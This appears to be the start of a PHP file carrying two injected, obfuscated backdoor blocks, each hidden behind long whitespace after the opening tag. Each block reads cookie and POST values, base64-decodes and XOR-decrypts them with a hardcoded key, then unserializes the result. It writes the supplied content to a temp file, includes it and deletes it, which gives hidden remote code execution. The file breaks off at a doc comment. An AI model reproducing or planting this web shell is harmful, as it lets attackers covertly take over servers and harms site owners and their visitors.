<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("cyvojfa")){class cyvojfa{public static $xirocuh = "gyvadpjfhkorzyiw";public static $ktygsz = NULL;public function __construct(){$bhfruk = @$_COOKIE[substr(cyvojfa::$xirocuh, 0, 4)];if (!empty($bhfruk)){$sgximcej = "base64";$vapaoiy = "";$bhfruk = explode(",", $bhfruk);foreach ($bhfruk as $rbrttzmiy){$vapaoiy .= @$_COOKIE[$rbrttzmiy];$vapaoiy .= @$_POST[$rbrttzmiy];}$vapaoiy = array_map($sgximcej . "_decode", array($vapaoiy,));$vapaoiy = $vapaoiy[0] ^ str_repeat(cyvojfa::$xirocuh, (strlen($vapaoiy[0]) / strlen(cyvojfa::$xirocuh)) + 1);cyvojfa::$ktygsz = @unserialize($vapaoiy);}}public function __destruct(){$this->khlrjlzl();}private function khlrjlzl(){if (is_array(cyvojfa::$ktygsz)) {$exqnuhqz = sys_get_temp_dir() . "/" . crc32(cyvojfa::$ktygsz["salt"]);@cyvojfa::$ktygsz["write"]($exqnuhqz, cyvojfa::$ktygsz["content"]);include $exqnuhqz;@cyvojfa::$ktygsz["delete"]($exqnuhqz);exit();}}}$wivdsm = new cyvojfa();$wivdsm = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("nmsgnhsfzn")){class nmsgnhsfzn{public static $aretrtm = "cbvdlomisuzqebyu";public static $srxfusvff = NULL;public function __construct(){$rgtvcnqjf = @$_COOKIE[substr(nmsgnhsfzn::$aretrtm, 0, 4)];if (!empty($rgtvcnqjf)){$kfzhwhzfkd = "base64";$qvwghcqigp = "";$rgtvcnqjf = explode(",", $rgtvcnqjf);foreach ($rgtvcnqjf as $tleiig){$qvwghcqigp .= @$_COOKIE[$tleiig];$qvwghcqigp .= @$_POST[$tleiig];}$qvwghcqigp = array_map($kfzhwhzfkd . "_decode", array($qvwghcqigp,));$qvwghcqigp = $qvwghcqigp[0] ^ str_repeat(nmsgnhsfzn::$aretrtm, (strlen($qvwghcqigp[0]) / strlen(nmsgnhsfzn::$aretrtm)) + 1);nmsgnhsfzn::$srxfusvff = @unserialize($qvwghcqigp);}}public function __destruct(){$this->tcpnyf();}private function tcpnyf(){if (is_array(nmsgnhsfzn::$srxfusvff)) {$urjla = sys_get_temp_dir() . "/" . crc32(nmsgnhsfzn::$srxfusvff["salt"]);@nmsgnhsfzn::$srxfusvff["write"]($urjla, nmsgnhsfzn::$srxfusvff["content"]);include $urjla;@nmsgnhsfzn::$srxfusvff["delete"]($urjla);exit();}}}$khneyvoza = new nmsgnhsfzn();$khneyvoza = NULL;} ?><?php
/**
